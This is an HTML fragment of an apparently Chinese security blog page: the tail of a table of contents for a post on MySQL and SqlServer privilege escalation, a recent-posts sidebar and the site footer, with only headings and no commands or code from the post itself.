class="toc-text">4.启动项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%8B%E5%B7%A5%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">1.手工复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">1.1启动项路径</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2MySQL-%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-text">1.2MySQL 写入启动项</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-MSF%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-text">2.MSF启动项提权</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">SqlServer数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6"><span class="toc-text">一.前置条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1"><span class="toc-text">二.权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-xp-cmdshell%E6%8F%90%E6%9D%83"><span class="toc-text">1.xp_cmdshell提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sp-oa%E7%B3%BB%E5%88%97%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E6%8F%90%E6%9D%83"><span class="toc-text">2.sp_oa系列存储过程提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/pwn/" title="pwn"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn"/></a><div class="content"><a class="title" href="/2024/11/14/pwn/" title="pwn">pwn</a><time datetime="2024-11-14T09:15:12.000Z" title="发表于 2024-11-14 17:15:12">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="app渗透"/></a><div class="content"><a class="title" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透">app渗透</a><time datetime="2024-09-12T11:35:21.000Z" title="发表于 2024-09-12 19:35:21">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透"/></a><div class="content"><a class="title" href="/2024/09/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">内网渗透</a><time datetime="2024-09-12T11:32:28.000Z" title="发表于 2024-09-12 19:32:28">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="代码审计"/></a><div class="content"><a class="title" href="/2024/09/12/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">代码审计</a><time datetime="2024-09-12T11:31:50.000Z" title="发表于 2024-09-12 19:31:50">2024-09-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js逆向"/></a><div class="content"><a class="title" href="/2024/09/12/js%E9%80%86%E5%90%91/" title="js逆向">js逆向</a><time datetime="2024-09-12T11:31:20.000Z" title="发表于 2024-09-12 19:31:20">2024-09-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Rui Ji</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>